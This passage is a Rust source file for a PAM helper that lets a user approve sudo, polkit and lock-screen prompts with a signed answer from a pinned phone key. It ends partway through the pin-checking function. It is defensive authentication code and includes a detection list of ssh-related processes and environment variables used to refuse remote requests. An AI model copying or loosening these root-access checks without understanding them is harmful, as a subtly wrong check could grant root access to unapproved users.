//! `pocketdesk-pam-ask`: approve sudo, polkit and the lock screen (each
//! with its own switch beyond sudo) on the owner's phone. PAM runs it
//! through `pam_exec` as `auth sufficient`, so a failure here only means the
//! password prompt comes next: the password always stays. Pocketdesk never
//! edits `/etc/pam.d`; Settings shows the lines to add.
//!
//! Under PAM (`PAM_TYPE` set) the only way to exit 0 is a verified
//! signature for `PAM_TYPE=auth`: any other argument, a missing or other
//! `PAM_TYPE`, a `PAM_*` variable given twice, and every failure exit 1
//! (review N4, N5). There it:
//! 1. refuses a service it does not know, the lock screen and polkit unless
//!    their switches are on, a request whose asking user (`PAM_RUSER`) is
//!    not the user, and (with "Only from this desk", on, a best-effort
//!    guard) a request from ssh;
//! 2. reads the phones' keys root pinned in `/etc/pocketdesk/pam/<user>.json`
//!    (owned by root and writable by root alone, as are its folders), with
//!    the computer's certificate hash; no pin means it gives up at once;
//! 3. becomes the user for good, reads the user's settings and gives up at
//!    once when the feature is off, the server is not running, or more than
//!    three requests came in the last minute (five minutes for the lock
//!    screen);
//! 4. makes a request with a fresh 32-byte nonce, bound to the computer,
//!    the service, the user, the asking user, the command (the asking
//!    program's executable and arguments, every hidden character shown,
//!    never cut), the tty, the asking processes and the time, and leaves it
//!    for the server, which puts it to the linked phones or says at once
//!    that none is linked;
//! 5. waits at most the timeout (20 s by default, 5 to 60) for an answer,
//!    and approves only a Yes signed over this very request by the key root
//!    pinned for the phone that answered ([`crate::phone_approves::verify`]).
//!
//! `--pin USER` (as root) pins a phone's key only after checking its
//! Android Key Attestation up to Google's roots ([`crate::attestation`]):
//! the phone makes the key with the pin request's hash as its challenge.
//! `--pin-without-attestation USER` is for phones without attestation, with
//! a warning. Also `--unpin USER`, `--lines` and `--test` (as the user, a
//! dry ask that touches no PAM).

use std::ffi::CString;
use std::io::{Read as _, Write as _};
use std::os::unix::fs::{MetadataExt as _, OpenOptionsExt as _};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use base64::Engine as _;
use pocketdesk_core::local::approve::{self as files, PhoneKey, Request, Status};
use pocketdesk_core::local::config::Config;
use pocketdesk_core::protocol::approve::{
    Approval, HELPER_PATH, Kind, MAX_COMMAND, MAX_ORIGIN, MAX_TIMEOUT_SECS, MAX_TTY,
    MIN_TIMEOUT_SECS, NONCE_LEN, PAM_SERVICES, PIN_DIR, PIN_SERVICE, PIN_TIMEOUT_SECS,
    is_plain_name, pam_line, shown_text, signed_message,
};
use pocketdesk_core::protocol::ask::Answer;
use serde::{Deserialize, Serialize};

use crate::phone_approves::{Refusal, verify};

/// How long the server has to take a request before the helper gives up.
const TAKE_WAIT: Duration = Duration::from_secs(2);
const POLL: Duration = Duration::from_millis(100);
/// The most of the asking processes named in a request.
const ORIGIN_DEPTH: usize = 6;

/// What root pinned for one user.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Pin {
    pub user: String,
    /// The computer's certificate hash (lowercase hex SHA-256).
    pub computer: String,
    pub keys: Vec<PhoneKey>,
    pub pinned_unix: u64,
}

/// Why the helper gives up (and the password prompt comes).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GiveUp {
    NotPam,
    BadLine(String),
    UnknownService(String),
    LockScreenOff,
    PolkitOff,
    OtherUser,
    Remote,
    TooLong,
    RateLimited,
    NotPinned(String),
    NoUser,
    Off,
    ServerDown,
    NoPhone,
    NotTaken,
    NoAnswer,
    Refused(Refusal),
    Broken(String),
}

impl GiveUp {
    fn said(&self) -> String {
        match self {
            GiveUp::NotPam => "not run by PAM for authentication".to_string(),
            GiveUp::BadLine(why) => format!("the PAM line is wrong ({why}); it only fails"),
            GiveUp::UnknownService(s) => format!("PAM service {s:?} is not one it approves"),
            GiveUp::LockScreenOff => "the lock screen is not approved by phone here".to_string(),
            GiveUp::PolkitOff => "polkit is not approved by phone here".to_string(),
            GiveUp::OtherUser => "asked by another user".to_string(),
            GiveUp::Remote => "only from this desk: a request from ssh is refused".to_string(),
            GiveUp::TooLong => "the command is too long to show whole".to_string(),
            GiveUp::RateLimited => "too many requests just now".to_string(),
            GiveUp::NotPinned(why) => format!("no phone key pinned: {why}"),
            GiveUp::NoUser => "no such user".to_string(),
            GiveUp::Off => "Approve with my phone is off".to_string(),
            GiveUp::ServerDown => "Pocketdesk is not running".to_string(),
            GiveUp::NoPhone => "no phone that may approve is linked".to_string(),
            GiveUp::NotTaken => "Pocketdesk did not take the request".to_string(),
            GiveUp::NoAnswer => "no answer in time".to_string(),
            GiveUp::Refused(Refusal::Declined) => "declined on the phone".to_string(),
            GiveUp::Refused(r) => format!("the answer was refused ({r:?})"),
            GiveUp::Broken(why) => why.clone(),
        }
    }
}

/// What the helper was asked to do.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Mode {
    /// Under PAM, with the line's `--kind` if it said one.
    Pam(Option<Kind>),
    /// Under PAM with arguments it does not take: fail, always.
    BadLine(String),
    Lines,
    Test,
    Pin {
        user: String,
        attested: bool,
    },
    Unpin(String),
    Help,
    Usage,
}

/// The mode for `args` (without the program name). With `PAM_TYPE` in the
/// environment, only PAM's mode, or a failure (review N4: a line such as
/// `pocketdesk-pam-ask --lines` must never let everyone in).
pub fn mode_of(args: &[String], under_pam: bool) -> Mode {
    let a: Vec<&str> = args.iter().map(String::as_str).collect();
    if under_pam {
        return match a.as_slice() {
            [] => Mode::Pam(None),
            ["--kind", "admin"] => Mode::Pam(Some(Kind::Admin)),
            ["--kind", "unlock"] => Mode::Pam(Some(Kind::Unlock)),
            _ => Mode::BadLine(format!("arguments {a:?}")),
        };
    }
    match a.as_slice() {
        ["--lines"] => Mode::Lines,
        ["--test"] => Mode::Test,
        ["--pin", user] => Mode::Pin {
            user: user.to_string(),
            attested: true,
        },
        ["--pin-without-attestation", user] => Mode::Pin {
            user: user.to_string(),
            attested: false,
        },
        ["--unpin", user] => Mode::Unpin(user.to_string()),
        ["--help" | "-h"] => Mode::Help,
        _ => Mode::Usage,
    }
}

/// The `PAM_*` items pam_exec passes.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct PamEnv {
    pub pam_type: Option<String>,
    pub user: Option<String>,
    pub service: Option<String>,
    pub rhost: Option<String>,
    pub ruser: Option<String>,
    pub tty: Option<String>,
}

/// The items from the environment's entries, in order. A name given twice
/// is refused (review N5: pam_exec puts its items after the PAM
/// environment, and the first would win).
pub fn pam_env(vars: &[(String, String)]) -> Result<PamEnv, GiveUp> {
    let mut env = PamEnv::default();
    for (name, value) in vars {
        let slot = match name.as_str() {
            "PAM_TYPE" => &mut env.pam_type,
            "PAM_USER" => &mut env.user,
            "PAM_SERVICE" => &mut env.service,
            "PAM_RHOST" => &mut env.rhost,
            "PAM_RUSER" => &mut env.ruser,
            "PAM_TTY" => &mut env.tty,
            _ => continue,
        };
        if slot.is_some() {
            return Err(GiveUp::Broken(format!("{name} is given twice")));
        }
        *slot = Some(value.clone());
    }
    Ok(env)
}

/// What a PAM service approves; `forced` from the PAM line's `--kind`.
pub fn kind_of(service: &str, forced: Option<Kind>) -> Option<Kind> {
    forced.or_else(|| {
        PAM_SERVICES
            .iter()
            .find(|(s, _)| *s == service)
            .map(|(_, k)| *k)
            .or(match service {
                "sudo-i" | "pkexec" => Some(Kind::Admin),
                "kscreenlocker" | "waylock" => Some(Kind::Unlock),
                _ => None,
            })
    })
}

fn is_polkit(service: &str) -> bool {
    matches!(service, "polkit-1" | "pkexec")
}

/// One process between the asking program and the first process.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Ancestor {
    pub pid: u32,
    /// Its name (`/proc/<pid>/comm`).
    pub comm: String,
    /// Its environment names an ssh connection.
    pub ssh_env: bool,
    /// It is in a logind session marked remote.
    pub remote_session: bool,
}

/// Whether a request comes from away from this desk: a remote host PAM
/// was told of, or an ssh server, an ssh environment or a remote session
/// among the asking program's ancestors. A best-effort guard against
/// prompts from ssh, not a boundary: tmux attached over ssh, `systemd-run`
/// or a timer get past it, and still need the phone.
pub fn is_remote(rhost: Option<&str>, hostname: &str, ancestors: &[Ancestor]) -> bool {
    let rhost_remote = rhost.is_some_and(|h| {
        let h = h.trim();
        !(h.is_empty()
            || h == "localhost"
            || h == "127.0.0.1"
            || h == "::1"
            || h.eq_ignore_ascii_case(hostname))
    });
    rhost_remote
        || ancestors.iter().any(|a| {
            a.ssh_env
                || a.remote_session
                || matches!(
                    a.comm.as_str(),
                    "sshd" | "sshd-session" | "sshd-auth" | "dropbear" | "mosh-server"
                )
        })
}

/// The asking processes as shown: `name(pid) < name(pid) …`, nearest first,
/// as many as fit (whole entries only).
pub fn origin_text(ancestors: &[Ancestor]) -> String {
    let mut out = String::new();
    for a in ancestors.iter().take(ORIGIN_DEPTH) {
        let entry = format!("{}({})", a.comm, a.pid);
        let Some(entry) = shown_text(&entry, MAX_ORIGIN) else {
            break;
        };
        let next = if out.is_empty() {
            entry
        } else {
            format!("{out} < {entry}")
        };
        if next.chars().count() > MAX_ORIGIN {
            break;
        }
        out = next;
    }
    out
}

/// A command as shown: the executable's path, then each argument, quoted
/// when it holds anything but plain characters; `None` when it would not
/// fit whole (it is never cut).
pub fn command_text(exe: &str, args: &[String]) -> Option<String> {
    let quote = |w: &str| {
        let plain = !w.is_empty()
            && w.bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"-_./=:,+@%".contains(&b));
        if plain {
            w.to_string()
        } else {
            format!("'{}'", w.replace('\'', "'\\''"))
        }
    };
    let words: Vec<String> = std::iter::once(quote(exe))
        .chain(args.iter().map(|a| quote(a)))
        .collect();
    shown_text(&words.join(" "), MAX_COMMAND)
}

/// Whether a pinned file or folder may be trusted: owned by root and
/// writable by no one else.
pub fn root_only(uid: u32, mode: u32) -> bool {
    uid == 0 && mode & 0o022 == 0
}

/// The timeout from the settings, kept within 5 to 60 seconds.
pub fn timeout_secs(config: &Config) -> u64 {
    config
        .phone_approves_timeout_secs
        .clamp(MIN_TIMEOUT_SECS, MAX_TIMEOUT_SECS)
}

/// The pinned keys a request may go to: every one, or those named in
/// "Which phones".
pub fn phones_for(pin: &Pin, config: &Config) -> Vec<PhoneKey> {
    pin.keys
        .iter()
        .filter(|k| {
            config.phone_approves_phones.is_empty()
                || config.phone_approves_phones.contains(&k.device_id)
        })
        .cloned()
        .collect()
}

/// What a request is, for the checks before asking.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Ask<'a> {
    pub kind: Kind,
    pub service: &'a str,
    pub user: &'a str,
    /// `PAM_RUSER`, if PAM was told.
    pub requester: Option<&'a str>,
    pub remote: bool,
}

/// The checks made before anything is asked, each of which gives up at once.
pub fn precheck(
    ask: Ask,
    config: &Config,
    server_running: bool,
    pin: &Pin,
) -> Result<Vec<PhoneKey>, GiveUp> {
    if !config.phone_approves {
        return Err(GiveUp::Off);
    }
    if ask.kind == Kind::Unlock && !config.phone_approves_lock_screen {
        return Err(GiveUp::LockScreenOff);
    }
    if is_polkit(ask.service) && !config.phone_approves_polkit {
        return Err(GiveUp::PolkitOff);
    }
    if ask
        .requester
        .is_some_and(|r| !r.is_empty() && r != ask.user)
    {
        return Err(GiveUp::OtherUser);
    }
    if ask.remote && config.phone_approves_local_only {
        return Err(GiveUp::Remote);
    }
    let phones = phones_for(pin, config);
    if phones.is_empty() {
        return Err(GiveUp::NotPinned("no phone chosen is pinned".to_string()));
    }
    if !server_running {
        return Err(GiveUp::ServerDown);
    }
    Ok(phones)
}

/// Whether one more request may go now, given the times of the last ones
/// for this service and user (review N3): three a minute, and three in five
/// minutes for the lock screen.
pub fn rate_allows(history: &[u64], now: u64, kind: Kind) -> bool {
    let window = if kind == Kind::Unlock { 300 } else { 60 };
    history
        .iter()
        .filter(|t| **t <= now && now - **t < window)
        .count()
        < 3
}

fn now_unix() -> u64 {
    pocketdesk_core::local::pin::now_unix()
}

fn new_nonce() -> Result<String, GiveUp> {
    use ring::rand::SecureRandom as _;
    let mut bytes = [0u8; NONCE_LEN];
    ring::rand::SystemRandom::new()
        .fill(&mut bytes)
        .map_err(|_| GiveUp::Broken("no randomness".to_string()))?;
    Ok(bytes.iter().map(|b| format!("{b:02x}")).collect())
}

/// Leave `approval` for the server and wait for an answer from a phone it
/// names, giving up at once on "no phone" or a server that does not take
/// it, and at its end otherwise. Whatever happens, the request is taken
/// back. The answer as the server passed it, not yet checked.
fn ask_for_answer(
    state_dir: &Path,
    approval: &Approval,
    phones: Vec<String>,
    sleep: impl Fn(Duration),
) -> Result<Status, GiveUp> {
    let request = Request {
        approval: approval.clone(),
        phones,
    };
    files::request(state_dir, &request)
        .map_err(|e| GiveUp::Broken(format!("the request could not be left: {e}")))?;
    let start = Instant::now();
    let wait = Duration::from_secs(approval.expires_unix.saturating_sub(approval.issued_unix));
    let result = loop {
        match files::status(state_dir, &approval.id) {
            Some(Status::NoPhone) => break Err(GiveUp::NoPhone),
            Some(answered @ Status::Answered { .. }) => break Ok(answered),
            Some(Status::Asked { .. }) => {}
            None if start.elapsed() >= TAKE_WAIT => break Err(GiveUp::NotTaken),
            None => {}
        }
        if start.elapsed() >= wait || now_unix() >= approval.expires_unix {
            break Err(GiveUp::NoAnswer);
        }
        sleep(POLL);
    };
    files::withdraw(state_dir, &approval.id);
    result
}

/// Ask and wait for a verified Yes: the phone that answered, or why not.
pub fn ask_and_wait(
    state_dir: &Path,
    approval: &Approval,
    phones: &[PhoneKey],
    sleep: impl Fn(Duration),
) -> Result<String, GiveUp> {
    let ids = phones.iter().map(|k| k.device_id.clone()).collect();
    match ask_for_answer(state_dir, approval, ids, sleep)? {
        Status::Answered {
            device_id,
            answer,
            signature,
            ..
        } => verify(
            approval,
            &device_id,
            answer,
            signature.as_deref(),
            phones,
            now_unix(),
        )
        .map(|()| device_id)
        .map_err(GiveUp::Refused),
        _ => Err(GiveUp::NoAnswer),
    }
}

/// A user's passwd entry.
struct User {
    uid: u32,
    gid: u32,
    home: PathBuf,
}

fn lookup_user(name: &str) -> Option<User> {
    let cname = CString::new(name).ok()?;
    let mut pwd: libc::passwd = unsafe { std::mem::zeroed() };
    let mut buf = vec![0 as libc::c_char; 16 * 1024];
    let mut result: *mut libc::passwd = std::ptr::null_mut();
    // SAFETY: every pointer is to a live local; getpwnam_r writes into buf.
    let rc = unsafe {
        libc::getpwnam_r(
            cname.as_ptr(),
            &mut pwd,
            buf.as_mut_ptr(),
            buf.len(),
            &mut result,
        )
    };
    if rc != 0 || result.is_null() || pwd.pw_dir.is_null() {
        return None;
    }
    // SAFETY: pw_dir points into buf, NUL-terminated by getpwnam_r.
    let home = unsafe { std::ffi::CStr::from_ptr(pwd.pw_dir) }
        .to_str()
        .ok()?
        .to_string();
    Some(User {
        uid: pwd.pw_uid,
        gid: pwd.pw_gid,
        home: PathBuf::from(home),
    })
}

/// Become `user` for good (the helper runs as root under sudo and polkit):
/// no supplementary groups, its group and its id, and not dumpable, so
/// nothing in the user's folder is ever touched as root.
fn become_user(user: &User) -> Result<(), GiveUp> {
    let broken = |what: &str| GiveUp::Broken(format!("could not become the user ({what})"));
    // SAFETY: plain syscalls on this process's own credentials.
    unsafe {
        if libc::geteuid() == 0 {
            if libc::setgroups(0, std::ptr::null()) != 0 {
                return Err(broken("setgroups"));
            }
            if libc::setgid(user.gid) != 0 {
                return Err(broken("setgid"));
            }
            if libc::setuid(user.uid) != 0 {
                return Err(broken("setuid"));
            }
        }
        if libc::getuid() != user.uid || libc::geteuid() != user.uid || libc::getegid() != user.gid
        {
            return Err(broken("ids"));
        }
        libc::prctl(libc::PR_SET_DUMPABLE, 0, 0, 0, 0);
    }
    Ok(())
}

fn pin_path(user: &str) -> PathBuf {
    Path::new(PIN_DIR).join(format!("{user}.json"))
}

/// Read root's pin for `user`, refusing one that root alone could not
/// have written (the file, its folder and `/etc/pocketdesk`).
fn read_pin(user: &str) -> Result<Pin, GiveUp> {
    let path = pin_path(user);
    for p in [
        Path::new("/etc/pocketdesk"),
        Path::new(PIN_DIR),
        path.as_path(),
    ] {
        let meta = std::fs::symlink_metadata(p)
            .map_err(|_| GiveUp::NotPinned(format!("{} is missing", p.display())))?;
        if meta.file_type().is_symlink() || !root_only(meta.uid(), meta.mode()) {
            return Err(GiveUp::NotPinned(format!(
                "{} must belong to root and be writable by root alone",
                p.display()
            )));
        }
    }
    let raw = std::fs::read_to_string(&path)
        .map_err(|e| GiveUp::NotPinned(format!("{}: {e}", path.display())))?;
    let pin: Pin = serde_json::from_str(&raw)
        .map_err(|e| GiveUp::NotPinned(format!("{}: {e}", path.display())))?;
    if pin.user != user {
        return Err(GiveUp::NotPinned("pinned for another user".to_string()));
    }
    Ok(pin)
}

/// Read a file the user owns without following a link or blocking on a
/// pipe, checked on the open file itself (review N1): a regular file of
/// `uid`'s, at most `cap` bytes.
fn read_users_file(path: &Path, uid: u32, cap: u64) -> Result<Vec<u8>, String> {
    let file = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK | libc::O_CLOEXEC)
        .open(path)
        .map_err(|e| format!("{}: {e}", path.display()))?;
    let meta = file
        .metadata()
        .map_err(|e| format!("{}: {e}", path.display()))?;
    if !meta.file_type().is_file() || meta.uid() != uid || meta.len() > cap {
        return Err(format!(
            "{} is not the user's own small file",
            path.display()
        ));
    }
    let mut bytes = Vec::new();
    file.take(cap + 1)
        .read_to_end(&mut bytes)
        .map_err(|e| format!("{}: {e}", path.display()))?;
    if bytes.len() as u64 > cap {
        return Err(format!("{} is too big", path.display()));
    }
    Ok(bytes)
}

/// The rate limit's file: root's own folder under sudo and polkit, the
/// user's runtime folder for a lock screen.
fn rate_file() -> Option<PathBuf> {
    // SAFETY: geteuid has no preconditions.
    let euid = unsafe { libc::geteuid() };
    let dir = if euid == 0 {
        PathBuf::from("/run/pocketdesk")
    } else {
        PathBuf::from(format!("/run/user/{euid}"))
    };
    if euid == 0 {
        use std::os::unix::fs::DirBuilderExt as _;
        let _ = std::fs::DirBuilder::new().mode(0o700).create(&dir);
    }
    let meta = std::fs::symlink_metadata(&dir).ok()?;
    (meta.is_dir() && meta.uid() == euid && meta.mode() & 0o022 == 0)
        .then(|| dir.join("pocketdesk-pam-ask-rate.json"))
}

/// Note a request for `key` now, if the rate allows one: whether it does.
/// No place to keep the count is no limit (the request still needs the
/// phone).
fn rate_take(key: &str, kind: Kind) -> bool {
    let Some(path) = rate_file() else {
        return true;
    };
    let now = now_unix();
    let mut all: std::collections::BTreeMap<String, Vec<u64>> = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK)
        .open(&path)
        .ok()
        .and_then(|f| {
            let mut s = String::new();
            f.take(64 * 1024).read_to_string(&mut s).ok()?;
            serde_json::from_str(&s).ok()
        })
        .unwrap_or_default();
    all.retain(|_, times| {
        times.retain(|t| *t <= now && now - *t < 300);
        !times.is_empty()
    });
    let history = all.get(key).cloned().unwrap_or_default();
    if !rate_allows(&history, now, kind) {
        return false;
    }
    all.entry(key.to_string()).or_default().push(now);
    let tmp = path.with_extension("json.tmp");
    let _ = std::fs::remove_file(&tmp);
    let written = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&tmp)
        .and_then(|mut f| f.write_all(serde_json::to_string(&all).unwrap_or_default().as_bytes()))
        .and_then(|()| std::fs::rename(&tmp, &path));
    if written.is_err() {
        let _ = std::fs::remove_file(&tmp);
    }
    true
}

fn proc_read(pid: u32, what: &str) -> Option<Vec<u8>> {
    std::fs::read(format!("/proc/{pid}/{what}")).ok()
}

fn parent_of(pid: u32) -> Option<u32> {
    let stat = String::from_utf8(proc_read(pid, "stat")?).ok()?;
    // `pid (comm) state ppid …`: comm may hold spaces and parentheses.
    let after = &stat[stat.rfind(')')? + 1..];
    after.split_whitespace().nth(1)?.parse().ok()
}

fn session_is_remote(pid: u32) -> bool {
    let Some(cgroup) = proc_read(pid, "cgroup").and_then(|c| String::from_utf8(c).ok()) else {
        return false;
    };
    let Some(id) = cgroup.split('/').find_map(|part| {
        part.trim()
            .strip_prefix("session-")
            .and_then(|s| s.strip_suffix(".scope"))
    }) else {
        return false;
    };
    if !id.bytes().all(|b| b.is_ascii_alphanumeric()) {
        return false;
    }
    std::fs::read_to_string(format!("/run/systemd/sessions/{id}"))
        .is_ok_and(|s| s.lines().any(|l| l.trim() == "REMOTE=1"))
}

/// The asking program and its ancestors, up to the first process.
fn ancestors() -> Vec<Ancestor> {
    let mut out = Vec::new();
    // SAFETY: getppid has no preconditions.
    let mut pid = unsafe { libc::getppid() } as u32;
    while pid > 1 && out.len() < 64 {
        let comm = proc_read(pid, "comm")
            .map(|c| String::from_utf8_lossy(&c).trim().to_string())
            .unwrap_or_default();
        let ssh_env = proc_read(pid, "environ").is_some_and(|env| {
            env.split(|b| *b == 0).any(|var| {
                [&b"SSH_CONNECTION="[..], b"SSH_CLIENT=", b"SSH_TTY="]
                    .iter()
                    .any(|p| var.starts_with(p))
            })
        });
        out.push(Ancestor {
            pid,
            comm,
            ssh_env,
            remote_session: session_is_remote(pid),
        });
        match parent_of(pid) {
            Some(parent) if parent != pid => pid = parent,
            _ => break,
        }
    }
    out
}

/// The asking program's command as shown: its executable (not the
/// `argv[0]` it chose) and its arguments; `None` when too long to show
/// whole.
fn parent_command() -> Option<String> {
    // SAFETY: getppid has no preconditions.
    let ppid = unsafe { libc::getppid() } as u32;
    let exe = std::fs::read_link(format!("/proc/{ppid}/exe"))
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "?".to_string());
    let raw = proc_read(ppid, "cmdline").unwrap_or_default();
    let args: Vec<String> = raw
        .split(|b| *b == 0)
        .skip(1)
        .map(|w| String::from_utf8_lossy(w).into_owned())
        .collect();
    // A trailing NUL makes one empty word.
    let args = match args.split_last() {
        Some((last, rest)) if last.is_empty() => rest.to_vec(),
        _ => args,
    };
    command_text(&exe, &args)
}

fn hostname() -> String {
    std::fs::read_to_string("/proc/sys/kernel/hostname")
        .map(|h| h.trim().to_string())
        .unwrap_or_default()
}

fn say(line: &str) {
    // `pam_exec … stdout` shows it to the person; otherwise it goes nowhere.
    let mut out = std::io::stdout();
    let _ = writeln!(out, "{line}");
    let _ = out.flush();
}

/// PAM's mode: `Ok` only for a verified Yes to `PAM_TYPE=auth`.
pub fn pam_mode(forced: Option<Kind>, env: &PamEnv) -> Result<String, GiveUp> {
    if env.pam_type.as_deref() != Some("auth") {
        return Err(GiveUp::NotPam);
    }
    let user = env.user.clone().ok_or(GiveUp::NoUser)?;
    let service = env.service.clone().unwrap_or_default();
    if !is_plain_name(&user) {
        return Err(GiveUp::NoUser);
    }
    if !is_plain_name(&service) || service == PIN_SERVICE {
        return Err(GiveUp::UnknownService(service));
    }
    let kind = kind_of(&service, forced).ok_or_else(|| GiveUp::UnknownService(service.clone()))?;
    let requester = env.ruser.clone().filter(|r| !r.is_empty());
    if requester.as_deref().is_some_and(|r| !is_plain_name(r)) {
        return Err(GiveUp::OtherUser);
    }
    // Read as root, before becoming the user: root's pin, and the asking
    // processes, which the user's processes cannot change.
    let pin = read_pin(&user)?;
    let chain = ancestors();
    let remote = is_remote(env.rhost.as_deref(), &hostname(), &chain);
    let command = if kind == Kind::Admin && !is_polkit(&service) {
        parent_command().ok_or(GiveUp::TooLong)?
    } else {
        String::new()
    };
    let tty = shown_text(env.tty.as_deref().unwrap_or(""), MAX_TTY).ok_or(GiveUp::TooLong)?;
    let origin = origin_text(&chain);
    let account = lookup_user(&user).ok_or(GiveUp::NoUser)?;
    // The count is root's under sudo and polkit: kept before the drop.
    let rate_key = format!("{service}:{user}");
    let ask = Ask {
        kind,
        service: &service,
        user: &user,
        requester: requester.as_deref(),
        remote,
    };
    // SAFETY: geteuid has no preconditions.
    let root = unsafe { libc::geteuid() } == 0;
    let mut counted = false;
    if root {
        // Only what needs no user file is checked before the count.
        if !rate_take(&rate_key, kind) {
            return Err(GiveUp::RateLimited);
        }
        counted = true;
    }
    become_user(&account)?;
    let state_dir = account.home.join(".local/state/pocketdesk");
    let config = Config::load_from(&account.home.join(".config/pocketdesk/config.toml"))
        .map_err(|e| GiveUp::Broken(format!("the settings do not read: {e}")))?;
    let running = pocketdesk_core::local::server::is_running(&state_dir);
    let phones = precheck(ask, &config, running, &pin)?;
    if !counted && !rate_take(&rate_key, kind) {
        return Err(GiveUp::RateLimited);
    }
    let now = now_unix();
    let approval = Approval {
        id: uuid::Uuid::new_v4().to_string(),
        kind,
        service: service.clone(),
        user: user.clone(),
        requester: requester.unwrap_or_default(),
        action: String::new(),
        command,
        tty,
        origin,
        computer: pin.computer.clone(),
        nonce: new_nonce()?,
        issued_unix: now,
        expires_unix: now + timeout_secs(&config),
    };
    say(&format!(
        "Approve on your phone (up to {} s), or wait for the password.",
        timeout_secs(&config)
    ));
    ask_and_wait(&state_dir, &approval, &phones, std::thread::sleep)
}

/// `--test`: a dry ask as the user, from Settings, checked against root's
/// pin. Exit 0 approved, 1 refused or no answer, 2 not set up.
fn test_mode() -> i32 {
    let Ok(state_dir) = pocketdesk_core::local::paths::state_dir() else {
        eprintln!("No state folder.");
        return 2;
    };
    let config = match Config::load() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("The settings do not read: {e}");
            return 2;
        }
    };
    let user = std::env::var("USER").unwrap_or_default();
    if !is_plain_name(&user) {
        println!("Not asked: no user name.");
        return 2;
    }
    let pin = match read_pin(&user) {
        Ok(pin) => pin,
        Err(e) => {
            println!(
                "Not asked: {}. Pin your phone first: sudo {HELPER_PATH} --pin {user}",
                e.said()
            );
            return 2;
        }
    };
    let running = pocketdesk_core::local::server::is_running(&state_dir);
    let ask = Ask {
        kind: Kind::Admin,
        service: "pocketdesk-test",
        user: &user,
        requester: None,
        remote: false,
    };
    let phones = match precheck(ask, &config, running, &pin) {
        Ok(p) => p,
        Err(e) => {
            println!("Not asked: {}.", e.said());
            return 2;
        }
    };
    let now = now_unix();
    let nonce = match new_nonce() {
        Ok(n) => n,
        Err(e) => {
            println!("{}", e.said());
            return 1;
        }
    };
    let approval = Approval {
        id: uuid::Uuid::new_v4().to_string(),
        kind: Kind::Admin,
        service: "pocketdesk-test".to_string(),
        user: user.clone(),
        requester: user.clone(),
        action: String::new(),
        command: "A test from Settings: nothing runs".to_string(),
        tty: String::new(),
        origin: "pocketdesk-app".to_string(),
        computer: pin.computer.clone(),
        nonce,
        issued_unix: now,
        expires_unix: now + timeout_secs(&config),
    };
    println!(
        "Asked your phone; waiting up to {} s…",
        timeout_secs(&config)
    );
    match ask_and_wait(&state_dir, &approval, &phones, std::thread::sleep) {
        Ok(_) => {
            println!("Approved: the signature checks against the pinned key.");
            0
        }
        Err(e) => {
            println!("Not approved: {}.", e.said());
            1
        }
    }
}

/// What the child (as the user) hands root at pin: the request it put, and
/// the answer.
#[derive(Serialize, Deserialize)]
struct PinAnswer {
    approval: Approval,
    device_id: String,
    answer: Answer,
    attestation: Option<Vec<String>>,
}

/// The child's part of a pin, as the user: read this computer's
/// certificate, ask the phones that turned the feature on to make an
/// attested key for `approval`, and return their answer.
fn pin_child(account: &User, mut approval: Approval) -> Result<PinAnswer, String> {
    become_user(account).map_err(|e| e.said())?;
    let state = account.home.join(".local/state/pocketdesk");
    let cert = read_users_file(
        &state.join(pocketdesk_core::local::paths::CERT_FILE),
        account.uid,
        64 * 1024,
    )?;
    approval.computer = ring::digest::digest(&ring::digest::SHA256, &cert)
        .as_ref()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    if !pocketdesk_core::local::server::is_running(&state) {
        return Err("Pocketdesk is not running for this user".to_string());
    }
    // Advisory only: which phones turned it on, to ask them.
    let phones: Vec<String> = files::keys(&state)
        .into_iter()
        .map(|k| k.device_id)
        .collect();
    if phones.is_empty() {
        return Err(
            "no phone has turned on \"Approve my computer's requests\" (and \"Answer my questions\" on the Devices page)"
                .to_string(),
        );
    }
    println!("Asked your phone; confirm there with your fingerprint (up to {PIN_TIMEOUT_SECS} s)…");
    match ask_for_answer(&state, &approval, phones, std::thread::sleep).map_err(|e| e.said())? {
        Status::Answered {
            device_id,
            answer,
            attestation,
            ..
        } => Ok(PinAnswer {
            approval,
            device_id,
            answer,
            attestation,
        }),
        _ => Err("no answer".to_string()),
    }
}

/// Root's check of a pin answer: the request root made, a Yes from a plain
/// device id, and a key attested by Google's roots for this request's
/// challenge (or, `attested` false, any P-256 key, with a warning). The
/// key to pin.
fn check_pin_answer(
    expected: &Approval,
    got: &PinAnswer,
    attested: bool,
    now_unix: u64,
) -> Result<PhoneKey, String> {
    let a = &got.approval;
    let same = a.id == expected.id
        && a.kind == Kind::Pin
        && a.service == PIN_SERVICE
        && a.user == expected.user
        && a.nonce == expected.nonce
        && a.issued_unix == expected.issued_unix
        && a.expires_unix == expected.expires_unix
        && a.computer.len() == 64;
    if !same {
        return Err("the answer is not for this pin".to_string());
    }
    if got.answer != Answer::Yes {
        return Err("declined on the phone".to_string());
    }
    if !is_plain_name(&got.device_id) && !pocketdesk_core::protocol::ask::is_ask_id(&got.device_id)
    {
        return Err("the phone's id is not one".to_string());
    }
    let chain: Vec<Vec<u8>> = got
        .attestation
        .as_deref()
        .unwrap_or_default()
        .iter()
        .map(|c| base64::engine::general_purpose::STANDARD.decode(c))
        .collect::<Result<_, _>>()
        .map_err(|_| "the attestation is not base64".to_string())?;
    let challenge = ring::digest::digest(&ring::digest::SHA256, &signed_message(a));
    let checked = crate::attestation::verify_chain(
        &chain,
        &crate::attestation::google_roots(),
        now_unix as i64,
    )
    .and_then(|(spki, d)| {
        crate::attestation::check_policy(&d, challenge.as_ref()).map(|level| (spki, d, level))
    });
    let (spki, level, biometric_only) = match checked {
        Ok((spki, d, level)) => (
            spki,
